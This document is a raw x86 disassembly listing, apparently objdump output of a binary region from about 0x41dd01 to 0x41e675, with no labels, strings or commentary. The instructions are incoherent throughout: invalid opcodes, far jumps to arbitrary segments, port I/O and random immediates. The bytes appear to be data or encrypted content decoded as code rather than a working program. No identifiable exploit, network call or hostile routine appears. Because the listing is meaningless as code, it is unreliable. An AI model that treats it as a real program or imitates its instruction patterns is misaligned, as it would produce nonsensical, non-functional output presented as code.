  41dd01:	jge    0x41dd1a
  41dd03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd04:	xchg   eax,esi
  41dd06:	lock fdiv QWORD PTR [edx]
  41dd0a:	ss enter 0xeb40,0xf4
  41dd0f:	shl    ecx,cl
  41dd11:	mov    BYTE PTR [ecx-0x72cd81a4],bh
  41dd17:	xor    al,0x58
  41dd19:	dec    esp
  41dd1a:	or     DWORD PTR ds:0x3e68bfd6,edi
  41dd20:	inc    eax
  41dd21:	pop    eax
  41dd22:	xor    ebp,esi
  41dd24:	shl    BYTE PTR [esi+ecx*8],0xfd
  41dd28:	loope  0x41dd2c
  41dd2a:	xchg   DWORD PTR [ecx+0x3f],ebx
  41dd2d:	add    BYTE PTR [ecx],0x81
  41dd30:	add    eax,esp
  41dd32:	ret    
  41dd33:	aas    
  41dd34:	add    ah,BYTE PTR ds:0xa888a023
  41dd3a:	jbe    0x41dd28
  41dd3c:	push   0xffffffe2
  41dd3e:	gs leave 
  41dd40:	xor    eax,0xe3684f75
  41dd45:	daa    
  41dd46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd47:	jg     0x41dccb
  41dd49:	push   ds
  41dd4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd4b:	stos   DWORD PTR es:[edi],eax
  41dd4c:	push   cs
  41dd4d:	push   ds
  41dd4e:	fmul   st,st(0)
  41dd50:	loope  0x41dd63
  41dd52:	popa   
  41dd53:	jmp    0x41dd3d
  41dd55:	xchg   esi,eax
  41dd56:	bound  eax,QWORD PTR [esi+0x4e]
  41dd59:	ds sub al,0x6f
  41dd5c:	mov    ebp,es
  41dd5e:	adc    bl,al
  41dd60:	lock sahf 
  41dd62:	pop    ebp
  41dd63:	das    
  41dd64:	sbb    DWORD PTR [esi],esi
  41dd66:	sbb    al,0xf1
  41dd68:	jmp    0xe848db51
  41dd6d:	inc    eax
  41dd6e:	cli    
  41dd6f:	jmp    0x41dd53
  41dd71:	sbb    BYTE PTR [edx+0x76503df7],0x70
  41dd78:	sbb    ch,dh
  41dd7a:	xchg   DWORD PTR [edx],ebx
  41dd7c:	mov    ecx,0xb18ad38a
  41dd81:	sub    al,0x9d
  41dd83:	xor    BYTE PTR [edi-0x8],bl
  41dd86:	push   0xffffff96
  41dd88:	mov    bh,0x33
  41dd8a:	push   0xcb35bfd2
  41dd8f:	cli    
	...
  41ddf4:	and    bl,dh
  41ddf6:	das    
  41ddf7:	cmp    bh,0xde
  41ddfa:	lods   eax,DWORD PTR ds:[esi]
  41ddfb:	repz pop ds
  41ddfd:	mov    bl,BYTE PTR [esi-0x41]
  41de00:	jmp    0x13d:0x84d61034
  41de07:	add    BYTE PTR [ecx+eax*1],al
  41de0a:	add    BYTE PTR [eax],al
  41de0c:	jnp    0x41de08
  41de0e:	jl     0x41de49
  41de10:	and    BYTE PTR [edi],0x8d
  41de13:	or     DWORD PTR [eax+0x7f132c4b],0xabf6f1ad
  41de1d:	int    0x5d
  41de1f:	pop    ss
  41de20:	shl    DWORD PTR [eax-0x57],cl
  41de23:	shl    DWORD PTR [esi],0x71
  41de26:	leave  
  41de27:	and    dl,BYTE PTR [edx]
  41de29:	mov    bh,0x81
  41de2b:	adc    ebp,DWORD PTR [ecx-0x361a7ea]
  41de31:	mov    eax,0x9bd30441
  41de36:	call   0x4c58:0xfab9bbc5
  41de3d:	cmp    BYTE PTR [ecx],dh
  41de3f:	cwde   
  41de40:	cwde   
  41de41:	add    BYTE PTR [edi+0x406b5918],0x9b
  41de48:	pop    esp
  41de49:	sub    DWORD PTR [ecx-0x14002b87],eax
  41de4f:	leave  
  41de50:	mov    edi,0x5eb035b9
  41de55:	jmp    FWORD PTR [edx-0xc]
  41de58:	cmp    dl,dh
  41de5a:	jmp    DWORD PTR [edi]
  41de5c:	(bad)  [eax]
  41de5e:	push   ss
  41de5f:	xor    BYTE PTR [edi-0x66],0x37
  41de63:	sbb    eax,0x2e666606
  41de68:	shr    DWORD PTR [ebp+0x37],0x5b
  41de6c:	std    
  41de6d:	sub    ah,BYTE PTR [ebx+0x6b]
  41de70:	jmp    0x41dec3
  41de72:	test   al,0x8
  41de74:	loope  0x41de1a
  41de76:	xstore-rng (bad)
  41de77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de78:	(bad)  
  41de79:	das    
  41de7a:	fisttp DWORD PTR [edx]
  41de7c:	add    dl,ah
  41de7e:	add    esi,esi
  41de80:	lods   al,BYTE PTR ds:[esi]
  41de81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de82:	aad    0x44
  41de84:	ret    0x7f15
  41de87:	sbb    ch,BYTE PTR [ebx+edx*8+0x2fd8a38]
  41de8e:	pop    ss
  41de8f:	xchg   ebp,esp
  41de91:	lea    edx,[esi+0xbf9e54e]
  41de97:	jp     0x41de73
  41de99:	rol    BYTE PTR [esi+0x56],1
  41de9c:	or     edi,edi
  41de9e:	mov    ah,0xdd
  41dea0:	div    BYTE PTR [esi+0x168f8386]
  41dea6:	cmp    dh,ah
  41dea8:	fistp  DWORD PTR [edi]
  41deaa:	lock xor DWORD PTR [ebx],eax
  41dead:	sub    BYTE PTR [ecx+0x48621743],0x47
  41deb4:	call   0xb08c76a6
  41deb9:	push   esi
  41deba:	and    cl,BYTE PTR [eax]
  41debc:	aas    
  41debd:	gs popf 
  41debf:	imul   ecx,DWORD PTR [edx-0x15],0x4
  41dec3:	test   BYTE PTR ds:[edx-0x4bbe77c4],ch
  41deca:	arpl   WORD PTR [edi+0x7a6ab637],cx
  41ded0:	xchg   ebp,eax
  41ded1:	in     al,dx
  41ded2:	imul   edx,edi,0xffffffac
  41ded5:	aad    0xb7
  41ded7:	xchg   ebp,eax
  41ded8:	data16 cmp cl,BYTE PTR [ecx+eax*2-0x3e]
  41dedd:	sar    DWORD PTR [ecx-0x13],0xfe
  41dee1:	ja     0x41de8d
  41dee3:	popa   
  41dee4:	outs   dx,BYTE PTR ds:[esi]
  41dee5:	jnp    0x41defb
  41dee7:	and    BYTE PTR [ebp-0x7b7907c5],0x55
  41deee:	sub    al,0xc7
  41def0:	es mov bh,dl
  41def3:	dec    edi
  41def4:	sbb    eax,0xdef2db74
  41def9:	add    al,0x8d
  41defb:	cmp    BYTE PTR [ecx+ebx*2+0x35],cl
  41deff:	inc    ecx
  41df00:	sbb    eax,0xdbc02da3
  41df05:	jmp    0x3b23:0xc14e5f6
  41df0c:	and    ch,al
  41df0e:	adc    cl,0x0
	...
  41df71:	add    BYTE PTR [eax],al
  41df73:	add    BYTE PTR [edi],bh
  41df75:	daa    
  41df76:	push   ss
  41df77:	cld    
  41df78:	push   ds
  41df79:	std    
  41df7a:	jmp    edi
  41df7c:	dec    edi
  41df7d:	push   0x4a0c9ce9
  41df82:	sbb    al,0x24
  41df84:	mov    BYTE PTR [esi],bh
  41df86:	add    DWORD PTR [eax],eax
  41df88:	add    al,0x1
  41df8a:	add    BYTE PTR [eax],al
  41df8c:	jns    0x41df40
  41df8e:	adc    ah,BYTE PTR [esi+0x28]
  41df91:	xor    eax,DWORD PTR [edx-0x39]
  41df94:	cdq    
  41df95:	(bad)  
  41df96:	mov    cl,0x55
  41df98:	push   edi
  41df99:	test   al,0x2d
  41df9b:	and    BYTE PTR [eax],bh
  41df9d:	ins    BYTE PTR es:[edi],dx
  41df9e:	and    DWORD PTR [ecx],edx
  41dfa0:	cmp    al,0x13
  41dfa2:	xchg   ebp,eax
  41dfa3:	lods   al,BYTE PTR ds:[esi]
  41dfa4:	aas    
  41dfa5:	mov    dh,0x8a
  41dfa7:	adc    al,0xe4
  41dfa9:	inc    DWORD PTR [edi-0x76]
  41dfac:	push   ds
  41dfad:	imul   bh
  41dfaf:	push   ebp
  41dfb0:	(bad)  
  41dfb1:	jnp    0x41e00e
  41dfb3:	mov    ebx,0x290e9336
  41dfb8:	jne    0x41df64
  41dfba:	lahf   
  41dfbb:	inc    edx
  41dfbc:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41dfbe:	mov    bh,0xf
  41dfc0:	dec    ebp
  41dfc1:	stos   BYTE PTR es:[edi],al
  41dfc2:	ins    DWORD PTR es:[edi],dx
  41dfc3:	aas    
  41dfc4:	sbb    ah,BYTE PTR [ebx+0x5e]
  41dfc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dfc8:	aam    0xd8
  41dfca:	lock loopne 0x41e01c
  41dfcd:	and    BYTE PTR [ebx-0x1c],ch
  41dfd0:	ja     0x41e011
  41dfd2:	mov    eax,ds:0x50941bf5
  41dfd7:	fsub   DWORD PTR [edx+0x26]
  41dfda:	sub    BYTE PTR [eax+0x432e437b],bh
  41dfe0:	stos   DWORD PTR es:[edi],eax
  41dfe1:	popa   
  41dfe2:	xchg   esi,eax
  41dfe3:	mov    ch,0x1b
  41dfe5:	outs   dx,BYTE PTR ds:[esi]
  41dfe6:	sub    al,0xe
  41dfe8:	jb     0x41e041
  41dfea:	ins    BYTE PTR es:[edi],dx
  41dfeb:	mov    ah,0x58
  41dfed:	clc    
  41dfee:	and    al,0xbf
  41dff0:	or     al,0x37
  41dff2:	in     eax,0xce
  41dff4:	jg     0x41e019
  41dff6:	cwde   
  41dff7:	xchg   DWORD PTR [ebx-0x15],ecx
  41dffa:	shl    DWORD PTR [ebp+ebp*4-0x3c],0x47
  41dfff:	shr    DWORD PTR [ecx-0x776317f],0x1b
  41e006:	mov    ds:0xbf8d86bb,al
  41e00b:	dec    esi
  41e00c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e00d:	enter  0x9c29,0x5d
  41e011:	frstor [eax]
  41e013:	mov    ebp,0xabff8bd9
  41e018:	jge    0x41dfdf
  41e01a:	and    esp,esp
  41e01c:	jo     0x41e036
  41e01e:	sub    al,0xe3
  41e020:	(bad)  [edi-0x5b43541e]
  41e026:	popa   
  41e027:	lahf   
  41e028:	lods   al,BYTE PTR ds:[esi]
  41e029:	or     DWORD PTR [esi],ebx
  41e02b:	xor    al,0x65
  41e02d:	sub    ah,BYTE PTR [ecx+0x24]
  41e030:	inc    ebp
  41e031:	ins    BYTE PTR es:[edi],dx
  41e032:	out    dx,al
  41e033:	mov    DWORD PTR [ebx],ebp
  41e035:	push   edx
  41e036:	jbe    0x41dfd9
  41e038:	and    BYTE PTR [esp+ecx*4+0x10],bh
  41e03c:	mov    dh,BYTE PTR [esi-0x1c007223]
  41e042:	cmc    
  41e043:	sbb    BYTE PTR [esi+0x54],bh
  41e046:	ror    DWORD PTR [ebp+0x282bcdbf],0xcd
  41e04d:	shl    DWORD PTR [esi-0x314cea02],1
  41e053:	js     0x41e05a
  41e055:	pop    es
  41e056:	repnz ss push edi
  41e059:	adc    al,0x91
  41e05b:	add    BYTE PTR [ebx],dl
  41e05d:	adc    bh,bh
  41e05f:	push   ebp
  41e060:	dec    edx
  41e061:	sub    BYTE PTR ds:0x160a642d,0x2f
  41e068:	mov    dl,0xb3
  41e06a:	sbb    DWORD PTR [esi-0x1e],ebp
  41e06d:	fmulp  st(3),st
  41e06f:	xchg   ecx,eax
  41e070:	cwde   
  41e071:	rcl    BYTE PTR [eax-0x24578315],0xe9
  41e078:	pop    eax
  41e079:	cmp    DWORD PTR [ebp+ebx*4-0x4103cf29],ecx
  41e080:	and    WORD PTR [edx+0x7c],0xff99
  41e085:	dec    edi
  41e086:	xchg   esi,eax
  41e087:	add    eax,0x24b4b789
  41e08c:	jge    0x41e0ff
  41e08e:	push   eax
  41e08f:	adc    eax,0x0
	...
  41e0f4:	dec    edi
  41e0f5:	push   ebx
  41e0f6:	add    al,0xc
  41e0f8:	sbb    al,0x5f
  41e0fa:	dec    edi
  41e0fb:	push   ebx
  41e0fc:	out    0x6d,eax
  41e0fe:	aad    0x48
  41e100:	fld    TBYTE PTR [ecx-0x61]
  41e103:	ja     0x41e091
  41e105:	aas    
  41e106:	add    DWORD PTR [eax],eax
  41e108:	add    al,0x1
  41e10a:	add    BYTE PTR [eax],al
  41e10c:	push   ss
  41e10d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e10e:	loop   0x41e11f
  41e110:	mov    al,0x9
  41e112:	mov    ch,0xf7
  41e114:	mov    esp,0xa059c755
  41e119:	shr    DWORD PTR [ebp+0x23],cl
  41e11c:	mov    esi,0xc46d96ef
  41e121:	push   eax
  41e122:	sar    BYTE PTR [edi-0x1a],1
  41e125:	xor    dl,BYTE PTR [ebp-0x32d85e13]
  41e12b:	mov    bh,0x5f
  41e12d:	push   ebx
  41e12e:	mov    DWORD PTR [edx-0x8],esp
  41e131:	dec    ebp
  41e132:	pop    ecx
  41e133:	adc    al,0x83
  41e135:	mov    cl,0x9a
  41e137:	jae    0x41e0cb
  41e139:	push   edx
  41e13a:	sahf   
  41e13b:	in     eax,dx
  41e13c:	stos   BYTE PTR es:[edi],al
  41e13d:	aam    0x6b
  41e13f:	(bad)
  41e144:	pop    ds
  41e145:	jmp    0x41e122
  41e147:	add    esi,esi
  41e149:	sub    eax,ebp
  41e14b:	shr    BYTE PTR [edi],0x50
  41e14e:	sbb    eax,0x62b06054
  41e153:	ficom  WORD PTR [eax-0x5c]
  41e156:	inc    esi
  41e157:	add    eax,DWORD PTR [ecx]
  41e159:	daa    
  41e15a:	gs scas al,BYTE PTR es:[edi]
  41e15c:	mov    edi,0xb0142de6
  41e161:	sub    eax,0xd1643381
  41e166:	jle    0x41e1d3
  41e168:	mov    ch,0x55
  41e16a:	retf   0x48ab
  41e16d:	mov    WORD PTR [ecx+ecx*1-0x30],cs
  41e171:	addr16 sub al,0x64
  41e174:	mov    esi,0x747e9a40
  41e179:	retf   0x1d31
  41e17c:	fwait
  41e17d:	mov    esp,fs
  41e17f:	pop    ebp
  41e180:	sub    bh,BYTE PTR [ecx]
  41e182:	es popa 
  41e184:	shl    BYTE PTR ds:0x526bef1a,cl
  41e18a:	arpl   WORD PTR [ebx+eiz*4-0x7d9397e],cx
  41e191:	cmp    eax,DWORD PTR [ebp+0x1a]
  41e194:	outs   dx,DWORD PTR ds:[esi]
  41e195:	push   eax
  41e196:	mov    eax,0x1cdee60a
  41e19b:	aas    
  41e19c:	push   es
  41e19d:	sub    eax,0xd925dedb
  41e1a2:	mov    ebp,0x9f8734c6
  41e1a7:	repz jge 0x41e137
  41e1aa:	jg     0x41e176
  41e1ac:	out    dx,al
  41e1ad:	inc    ecx
  41e1ae:	mov    edx,0xf9520797
  41e1b3:	iret   
  41e1b4:	shl    DWORD PTR [edi],1
  41e1b6:	add    BYTE PTR [eax+0x3cce7560],bh
  41e1bc:	lods   eax,DWORD PTR ds:[esi]
  41e1bd:	mov    bh,0x9b
  41e1bf:	mov    ch,0xc9
  41e1c1:	ror    BYTE PTR [eax],cl
  41e1c3:	mov    dl,0xc2
  41e1c5:	add    esp,DWORD PTR [eax]
  41e1c7:	push   ds
  41e1c8:	repz aas 
  41e1ca:	lock xchg esp,eax
  41e1cc:	ret    0x5c1b
  41e1cf:	(bad)  
  41e1d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1d2:	sar    BYTE PTR gs:[ebp-0x78f82d98],1
  41e1d9:	fsub   DWORD PTR [esi-0x49]
  41e1dc:	mov    WORD PTR [esi+0x2d],es
  41e1df:	ins    DWORD PTR es:[edi],dx
  41e1e0:	in     eax,0x30
  41e1e2:	mov    WORD PTR [edx+0x7ea9ba6d],cs
  41e1e8:	iret   
  41e1e9:	mov    ds:0xedfe05e0,al
  41e1ee:	adc    al,0x94
  41e1f0:	add    al,0xab
  41e1f2:	mov    ebp,0x32a31fca
  41e1f7:	or     BYTE PTR [esi-0x54d02b25],dl
  41e1fd:	fimul  DWORD PTR [ecx]
  41e1ff:	sbb    dh,BYTE PTR [edi]
  41e201:	test   BYTE PTR [ebx+edi*1],ch
  41e204:	pop    DWORD PTR [edi+0x7e2be2e2]
  41e20a:	ret    0x4619
  41e20d:	and    dh,BYTE PTR [ebp+0x0]
	...
  41e274:	stos   DWORD PTR es:[edi],eax
  41e275:	add    dh,BYTE PTR [edi-0x1a]
  41e278:	push   edi
  41e27a:	mov    ebx,0x6f64c34f
  41e27f:	or     al,0xd7
  41e281:	dec    BYTE PTR [eax]
  41e283:	adc    DWORD PTR [eax+0x4000140],edx
  41e289:	add    DWORD PTR [eax],eax
  41e28b:	add    dl,cl
  41e28d:	bnd jg 0x41e296
  41e290:	out    0xcb,eax
  41e292:	outs   dx,BYTE PTR ds:[esi]
  41e293:	pop    esp
  41e294:	shr    BYTE PTR [edx+ebp*4-0x58],cl
  41e298:	aaa    
  41e299:	add    eax,0xdba248e3
  41e29e:	push   0xffffffc7
  41e2a0:	(bad)  
  41e2a1:	loopne 0x41e23c
  41e2a3:	jmp    0x4c12:0x418b4d70
  41e2aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e2ab:	rcr    DWORD PTR [edx],cl
  41e2ad:	fcmovne st,st(6)
  41e2af:	or     edi,DWORD PTR [ebp+0x7c]
  41e2b2:	loope  0x41e270
  41e2b4:	xor    DWORD PTR [edx],ebp
  41e2b6:	fimul  DWORD PTR [ecx+0x11]
  41e2b9:	mov    ds,WORD PTR [eax+edi*2]
  41e2bc:	shl    eax,cl
  41e2be:	sbb    al,0x96
  41e2c0:	pusha  
  41e2c1:	enter  0x1ece,0x65
  41e2c5:	loope  0x41e296
  41e2c7:	ss ins BYTE PTR es:[edi],dx
  41e2c9:	ins    DWORD PTR es:[edi],dx
  41e2ca:	hlt    
  41e2cb:	sbb    ecx,DWORD PTR [eax-0x32f26d97]
  41e2d1:	cmc    
  41e2d2:	bnd ja 0x41e350
  41e2d5:	pop    ss
  41e2d6:	push   ebx
  41e2d7:	dec    ebp
  41e2d8:	xchg   edi,eax
  41e2d9:	cmp    ecx,DWORD PTR [eax+ecx*2+0x727d08ae]
  41e2e0:	arpl   WORD PTR [ebx-0x3a909a4f],sp
  41e2e6:	iret   
  41e2e7:	or     ah,BYTE PTR [eax]
  41e2e9:	icebp  
  41e2ea:	jbe    0x41e340
  41e2ec:	retf   
  41e2ed:	pop    ss
  41e2ee:	lock ja 0x41e2e1
  41e2f1:	out    0xb3,al
  41e2f3:	jl     0x41e2aa
  41e2f5:	sub    DWORD PTR [ecx],esp
  41e2f7:	fistp  QWORD PTR es:[edi+0x76]
  41e2fb:	inc    ebx
  41e2fc:	inc    eax
  41e2fd:	and    al,0x7d
  41e2ff:	je     0x41e304
  41e301:	jge    0x41e29c
  41e303:	push   ds
  41e304:	pop    esi
  41e305:	add    DWORD PTR [edx-0x8],ecx
  41e308:	popf   
  41e309:	dec    BYTE PTR [eax]
  41e30b:	jmp    0x50da:0xd7f4080c
  41e312:	mov    cl,0x45
  41e314:	mov    ah,0x19
  41e316:	bound  ecx,QWORD PTR [ebx+0x6280809b]
  41e31c:	cdq    
  41e31d:	mov    bl,0x20
  41e31f:	sub    edx,0x531e7759
  41e325:	add    al,0xf1
  41e327:	xor    dl,bl
  41e329:	jae    0x41e2cf
  41e32b:	aam    0x18
  41e32d:	(bad)
  41e331:	stos   DWORD PTR es:[edi],eax
  41e332:	cmp    cl,bh
  41e334:	lahf   
  41e335:	xlat   BYTE PTR ds:[ebx]
  41e336:	jb     0x41e369
  41e338:	out    0x72,al
  41e33a:	leave  
  41e33b:	sub    DWORD PTR [edx-0x158f5ca6],eax
  41e341:	mov    esp,0x403b324f
  41e346:	inc    eax
  41e347:	mov    bh,0xf2
  41e349:	fs ja  0x41e2dd
  41e34c:	xchg   esp,eax
  41e34d:	sub    edx,DWORD PTR es:[edx]
  41e350:	sar    DWORD PTR [eax+ecx*8],cl
  41e353:	jge    0x41e37a
  41e355:	sub    eax,DWORD PTR [edx+esi*4]
  41e358:	mov    bh,0x4c
  41e35a:	outs   dx,BYTE PTR ds:[esi]
  41e35b:	jbe    0x41e3dc
  41e35d:	hlt    
  41e35e:	sbb    esi,DWORD PTR es:[edx]
  41e361:	out    0x51,al
  41e363:	jno    0x41e348
  41e365:	or     DWORD PTR [eax+0x33cfdc56],0x385582c5
  41e36f:	mov    bl,0x2c
  41e371:	pop    ebx
  41e372:	clc    
  41e373:	inc    eax
  41e374:	jecxz  0x41e3b0
  41e376:	dec    edi
  41e377:	(bad)  
  41e378:	hlt    
  41e379:	stos   DWORD PTR es:[edi],eax
  41e37a:	ret    0x30e8
  41e37d:	aad    0x6b
  41e37f:	out    0x19,eax
  41e381:	shr    ebx,1
  41e383:	popa   
  41e384:	push   cs
  41e385:	or     ah,BYTE PTR [ebx+0x56ed9b7b]
  41e38b:	push   esi
  41e38c:	push   ds
  41e38d:	adc    esp,ecx
  41e38f:	mov    ebx,0x0
	...
  41e3f4:	mov    DWORD PTR [edx],edx
  41e3f6:	ja     0x41e417
  41e3f8:	(bad)  
  41e3f9:	jg     0x41e3e4
  41e3fb:	xchg   esi,eax
  41e3fc:	or     DWORD PTR [edx+0x18],0xdc6f809
  41e403:	ret    0x4194
  41e406:	add    DWORD PTR [eax],eax
  41e408:	add    al,0x1
  41e40a:	add    BYTE PTR [eax],al
  41e40c:	clc    
  41e40d:	retf   
  41e40e:	retf   
  41e40f:	cld    
  41e410:	call   0xe7b4aad8
  41e415:	imul   edi,DWORD PTR [ecx-0x5b],0xffffffd5
  41e419:	push   esp
  41e41a:	popa   
  41e41b:	add    dl,cl
  41e41d:	inc    edx
  41e41e:	mov    ebp,DWORD PTR [ebx+0x1]
  41e421:	test   ebp,eax
  41e423:	(bad)  [esi+eiz*4+0x43bf83dd]
  41e42a:	outs   dx,DWORD PTR ds:[esi]
  41e42b:	sub    DWORD PTR [ebx+0x3c],esp
  41e42e:	sub    ebp,DWORD PTR ds:0x7d49e935
  41e434:	dec    esi
  41e435:	fstp   TBYTE PTR [ebp-0x51]
  41e438:	cmp    dh,BYTE PTR [eax]
  41e43a:	outs   dx,BYTE PTR ds:[esi]
  41e43b:	or     eax,0x82648e0c
  41e440:	mov    al,0x2d
  41e442:	mov    al,al
  41e444:	sar    DWORD PTR [edi],0x7d
  41e447:	pushf  
  41e448:	mov    cl,0xb0
  41e44a:	mov    ecx,0xb6bbf1b3
  41e44f:	pop    esp
  41e450:	add    BYTE PTR [ebx],cl
  41e452:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e453:	push   ds
  41e454:	inc    ebx
  41e455:	loopne 0x41e47e
  41e457:	fist   DWORD PTR [eax+0x66]
  41e45a:	mov    esp,0xc6d0648d
  41e45f:	nop
  41e460:	lods   al,BYTE PTR ds:[esi]
  41e462:	sub    BYTE PTR [edx-0x7d],cl
  41e465:	push   0xdb1ef54b
  41e46a:	push   ecx
  41e46b:	sub    ebx,DWORD PTR [edx+0x54574179]
  41e471:	into   
  41e472:	push   esi
  41e473:	xor    ch,bh
  41e475:	add    ch,dl
  41e477:	or     dh,bh
  41e479:	ror    BYTE PTR [esi+edx*2-0x15bb455d],cl
  41e480:	or     eax,0xbd6861e7
  41e485:	je     0x41e4e5
  41e487:	mov    ds:0x21b7c16,eax
  41e48c:	pop    eax
  41e48d:	sar    BYTE PTR [edx+0x74],1
  41e490:	stos   DWORD PTR es:[edi],eax
  41e491:	clc    
  41e492:	push   eax
  41e493:	gs dec ecx
  41e495:	sbb    BYTE PTR [eax],dh
  41e497:	sbb    DWORD PTR [ecx],eax
  41e499:	retf   0xbdf9
  41e49c:	and    cl,al
  41e49e:	xor    al,0x14
  41e4a0:	fs mov bp,0x6e87
  41e4a5:	sub    edx,esp
  41e4a7:	push   0x8f267542
  41e4ac:	shr    DWORD PTR [esi+0x1216c3bf],0xd0
  41e4b3:	pop    DWORD PTR [ecx+0x34]
  41e4b6:	and    DWORD PTR [esi-0x7b],edx
  41e4b9:	mov    ah,BYTE PTR [ecx-0x62e9aeb4]
  41e4bf:	les    edx,FWORD PTR [esi+ecx*4-0x71f17024]
  41e4c6:	sahf   
  41e4c7:	ja     0x41e48f
  41e4c9:	and    bh,BYTE PTR [ebx+0x4ec37667]
  41e4cf:	dec    ebp
  41e4d0:	dec    ebx
  41e4d1:	idiv   BYTE PTR [esi-0x5a246571]
  41e4d7:	pushf  
  41e4d8:	scas   al,BYTE PTR es:[edi]
  41e4d9:	mov    esi,DWORD PTR [edx]
  41e4db:	push   edi
  41e4dc:	cmp    ebp,esp
  41e4de:	or     al,BYTE PTR [edx-0x4b]
  41e4e1:	dec    ebx
  41e4e2:	push   edi
  41e4e3:	jge    0x41e4d5
  41e4e5:	(bad)  
  41e4e6:	or     BYTE PTR [esi],cl
  41e4e8:	jbe    0x41e4e7
  41e4ea:	imul   ebp,DWORD PTR [edi+0x1b],0x62
  41e4ee:	movntq QWORD PTR [edi],mm6
  41e4f1:	add    BYTE PTR [eax+0xf],bl
  41e4f4:	mov    cl,0xcf
  41e4f6:	bound  eax,QWORD PTR [ebx-0x3]
  41e4f9:	add    eax,0xa1dd9940
  41e4fe:	push   edi
  41e4ff:	mov    WORD PTR [edi-0x31760dbe],?
  41e505:	cli    
  41e506:	mov    eax,0x65733fca
  41e50b:	fdiv   DWORD PTR [eax+0x15]
  41e50e:	out    0xd9,al
	...
  41e574:	and    BYTE PTR [edx-0x35],ch
  41e577:	dec    ebx
  41e578:	retf   
  41e579:	jmp    0x41e51b
  41e57b:	imul   ebp,ebx,0xffffffb1
  41e57e:	aaa    
  41e57f:	je     0x41e514
  41e581:	jns    0x41e549
  41e583:	xor    eax,0x14298
  41e588:	add    al,0x1
  41e58a:	add    BYTE PTR [eax],al
  41e58c:	jecxz  0x41e5ba
  41e58e:	adc    al,0xc8
  41e590:	ror    DWORD PTR [edi-0x27],1
  41e593:	sar    DWORD PTR [esi-0x7a],cl
  41e596:	push   edx
  41e597:	out    dx,eax
  41e598:	cdq    
  41e599:	ins    DWORD PTR es:[edi],dx
  41e59a:	mov    eax,0xc3bf6335
  41e59f:	scas   al,BYTE PTR es:[edi]
  41e5a0:	sti    
  41e5a1:	push   eax
  41e5a2:	stc    
  41e5a3:	fwait
  41e5a4:	xor    al,0x41
  41e5a6:	jl     0x41e5cd
  41e5a8:	mov    WORD PTR [edx],ss
  41e5aa:	sahf   
  41e5ab:	bound  edx,QWORD PTR [edx+0x59]
  41e5ae:	mov    DWORD PTR [ecx+esi*2+0x23],ebx
  41e5b2:	push   0xffffff8e
  41e5b4:	mov    ch,0xec
  41e5b6:	mov    ecx,0xbf386b61
  41e5bb:	(bad)  
  41e5bc:	dec    eax
  41e5bd:	sub    BYTE PTR [ebx-0x152ef4ad],cl
  41e5c3:	xchg   edi,eax
  41e5c4:	mov    ebx,0xf42301ca
  41e5c9:	les    esi,FWORD PTR [ebp+0x64]
  41e5cc:	dec    esp
  41e5cd:	fwait
  41e5ce:	je     0x41e64b
  41e5d0:	cmp    al,0xd8
  41e5d2:	sub    eax,0x61c8105f
  41e5d7:	mov    ds:0x30dd16c1,al
  41e5dc:	ins    BYTE PTR es:[edi],dx
  41e5dd:	xor    ch,BYTE PTR [edx]
  41e5df:	xor    esp,edi
  41e5e1:	push   ebp
  41e5e2:	xlat   BYTE PTR ds:[ebx]
  41e5e3:	ins    BYTE PTR es:[edi],dx
  41e5e4:	repz cli 
  41e5e6:	or     edi,DWORD PTR [edi-0x46b2923]
  41e5ec:	sbb    BYTE PTR [esi],dh
  41e5ee:	bound  edx,QWORD PTR [edx+edi*1-0x165e88c8]
  41e5f5:	or     ebx,DWORD PTR [ebp+0x50]
  41e5f8:	dec    edx
  41e5f9:	dec    edx
  41e5fa:	rol    ecx,0x2f
  41e5fd:	mov    gs,WORD PTR [ebx+0x42]
  41e600:	mov    dl,0x26
  41e602:	dec    edx
  41e603:	sbb    DWORD PTR [eax-0x45],0x53
  41e607:	ficom  DWORD PTR [eax-0x47]
  41e60a:	and    al,0x50
  41e60c:	loopne 0x41e59f
  41e60e:	mov    ch,0x2e
  41e610:	cmp    edx,edi
  41e612:	and    eax,0x59179c97
  41e617:	fiadd  WORD PTR [edi-0x6a]
  41e61a:	jge    0x41e5fc
  41e61c:	jbe    0x41e67f
  41e61e:	mov    bl,0xaa
  41e620:	rol    BYTE PTR [ecx],1
  41e622:	inc    edi
  41e623:	cmp    cl,BYTE PTR [esi-0x4598c25a]
  41e629:	jns    0x41e675
  41e62b:	ins    DWORD PTR es:[edi],dx
  41e62c:	call   0x8ab8:0x7a1077cd
  41e633:	(bad)  
  41e634:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e635:	lods   eax,DWORD PTR ds:[esi]
  41e636:	jb     0x41e61e
  41e638:	cmp    eax,ebp
  41e63a:	and    bh,bh
  41e63c:	xor    al,0x9c
  41e63e:	ret    
  41e63f:	retf   0xc4dc
  41e642:	stos   DWORD PTR es:[edi],eax
  41e643:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e644:	mov    eax,0x910d0b5
  41e649:	cmp    DWORD PTR [eax],esp
  41e64b:	mov    esp,0x6f104490
  41e650:	jmp    0x41e625
  41e652:	aas    
  41e653:	mov    al,0x98
  41e655:	push   ds
  41e656:	pusha  
  41e657:	xor    DWORD PTR [edx],ebx
  41e659:	sbb    eax,0xe85a1950
  41e65e:	je     0x41e5e4
  41e660:	dec    edx
  41e661:	inc    edi
  41e662:	pop    ecx
  41e663:	imul   ebp,DWORD PTR [edi+0x16],0xffffffff
  41e667:	jne    0x41e6ae
  41e669:	inc    esi
  41e66a:	cmp    al,0x1c
  41e66c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e66d:	lds    ebp,FWORD PTR [edx]
  41e66f:	(bad)  
  41e670:	nop
  41e671:	scas   eax,DWORD PTR es:[edi]
  41e672:	inc    edx
  41e673:	jbe    0x41e6c5
  41e675:	sub    ah,al
